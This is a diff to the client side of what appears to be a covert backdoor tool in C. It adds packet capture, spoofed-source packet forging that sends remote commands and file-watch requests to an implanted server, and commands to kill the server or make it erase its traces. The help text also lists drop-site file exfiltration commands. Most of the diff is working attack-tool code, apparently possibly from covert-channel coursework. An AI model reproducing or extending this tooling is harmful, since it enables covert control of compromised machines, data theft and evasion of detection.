@@ -18,9 +18,13 @@
 
 #include "client.h"
 #include "ssh_utils.h"
+#include "packet_utils.h"
 
 int main(int argc, char *argv[])
 {
+	pthread_t thread_cli;
+	int tret_cli;
+
 	/* parse CLI options */
 	if (parse_options(argc, argv) == ERROR_OPTS) {
 		err(1, "Invalid options");
@@ -38,6 +42,13 @@ int main(int argc, char *argv[])
 	if (setuid(0) != SUCCESS || setgid(0) != SUCCESS) {
 		err(1, "raise privileges");
 	}
+
+	/* start packet capture thread */
+	server = FALSE;
+	tret_cli = pthread_create(&thread_cli, NULL, pcap_start, (void *)NULL);
+
+	/* allow the pcap interface time to initialize */
+	sleep(1);
 
 	cli_interface();
 
@@ -93,6 +104,8 @@ int parse_options(int argc, char *argv[])
 		{0, 0, 0, 0}
 	};
 
+	/* defaults */
+	cli_vars.source_ip = "192.168.1.100";
 
 	if (argc != 5)
 		print_usage(argv[0], ERROR_OPTS_HELP);
@@ -156,12 +169,18 @@ void cli_interface(void)
 			cli_help();
 		else if (!strncmp(input, "quit\n", strlen(input)))
 			exit(SUCCESS);
-		else if (!strncmp(input, "quitserver\n", strlen(input)))
-			fprintf(stderr, "%s: not yet implemented\n", input);
-		else if (!strncmp(input, "serverpanic\n", strlen(input)))
-			fprintf(stderr, "%s: not yet implemented\n", input);
+		else if (!strncmp(input, "squit\n", strlen(input))) {
+				fprintf(stderr, "Quitting server...\n");
+				packet_forge(QUIT_CMD, cli_vars.source_ip, cli_vars.server_ip);
+		}
+		else if (!strncmp(input, "panic\n", strlen(input))) {
+				fprintf(stderr, "Panic quitting server...\n");
+				packet_forge(PANIC_CMD, cli_vars.source_ip, cli_vars.server_ip);
+		}
 		else if (!strncmp(input, "command\n", strlen(input)))
-			fprintf(stderr, "%s: not yet implemented\n", input);
+			cli_command();
+		else if (!strncmp(input, "watch\n", strlen(input)))
+			cli_watch();
 		else if (!strncmp(input, "getfile\n", strlen(input)))
 			fprintf(stderr, "%s: not yet implemented\n", input);
 		else if (!strncmp(input, "droplist\n", strlen(input)))
@@ -185,6 +204,7 @@ void cli_command(void)
 	size_t nbytes = 1024;
 	char *input = (char *)malloc(nbytes + 1);
 	char *command = (char *)malloc(nbytes + 1);
+	char *packet = (char *)malloc(nbytes + 1);
 
 	fprintf(stderr, "enter command > ");
 
@@ -193,12 +213,47 @@ void cli_command(void)
 	if (!strncmp(input, "\n", strlen(input)))
 		return;
 	else {
-		memset(command, 0x00, FILENAME_MAX);
+		memset(command, 0x00, nbytes + 1);
 		memcpy(command, input, strlen(input) - 1);
 		fprintf(stderr, "Sending to server...\n");
+
+		/* send command */
+		memset(packet, 0x00, nbytes + 1);
+		sprintf(packet, "%s%s%s", EXT_CMD_START, command, EXT_CMD_END);
+		packet_forge(packet, cli_vars.source_ip, cli_vars.server_ip);
 	}
 
 	free(input);
+	free(packet);
+	free(command);
+}
+
+void cli_watch(void)
+{
+	int bytes_read;
+	size_t nbytes = 1024;
+	char *input = (char *)malloc(nbytes + 1);
+	char *command = (char *)malloc(nbytes + 1);
+	char *packet = (char *)malloc(nbytes + 1);
+
+	fprintf(stderr, "enter file or directory > ");
+
+	bytes_read = getline(&input, &nbytes, stdin);
+
+	if (!strncmp(input, "\n", strlen(input)))
+		return;
+	else {
+		memset(command, 0x00, nbytes + 1);
+		memcpy(command, input, strlen(input) - 1);
+		fprintf(stderr, "Sending to server...\n");
+		
+		memset(packet, 0x00, nbytes + 1);
+		sprintf(packet, "%s%s%s", WATCH_CMD_START, command, WATCH_CMD_END);
+		packet_forge(packet, cli_vars.source_ip, cli_vars.server_ip);
+	}
+
+	free(input);
+	free(packet);
 	free(command);
 }
 
@@ -274,16 +329,17 @@ void cli_dropdel(void)
 void cli_help(void)
 {
 	fprintf(stderr, "  Command List:\n");
-	fprintf(stderr, "  ==============================================================\n");
-	fprintf(stderr, "  ?            Print out this list\n");
-	fprintf(stderr, "  help         Print out this list\n");
-	fprintf(stderr, "  quit         Exit the client\n");
-	fprintf(stderr, "  quitserver   Terminates the server\n");
-	fprintf(stderr, "  serverpanic  Deletes all traces of server and terminates\n");
-	fprintf(stderr, "  command      Enter a command for the server to execut.\n");
-	fprintf(stderr, "  getfile      Enter a file to transfer from server to drop site\n");
-	fprintf(stderr, "  droplist     Lists files on the drop site\n");
-	fprintf(stderr, "  dropget      Enter a file to get from the drop site\n");
-	fprintf(stderr, "  dropdel      Enter a file to delete from the drop site\n");
-	fprintf(stderr, "  dropclear    Deletes ALL files from the drop site\n");
+	fprintf(stderr, "  ============================================================\n");
+	fprintf(stderr, "  ?          Print out this list\n");
+	fprintf(stderr, "  help       Print out this list\n");
+	fprintf(stderr, "  quit       Exit the client\n");
+	fprintf(stderr, "  squit      Terminates the server\n");
+	fprintf(stderr, "  panic      Deletes all traces of server and terminates\n");
+	fprintf(stderr, "  command    Enter a command for the server to execut.\n");
+	fprintf(stderr, "  watch      Enter a file or directory to monitor.\n");
+	fprintf(stderr, "  getfile    Enter a file to transfer from server to drop site\n");
+	fprintf(stderr, "  droplist   Lists files on the drop site\n");
+	fprintf(stderr, "  dropget    Enter a file to get from the drop site\n");
+	fprintf(stderr, "  dropdel    Enter a file to delete from the drop site\n");
+	fprintf(stderr, "  dropclear  Deletes ALL files from the drop site\n");
 }
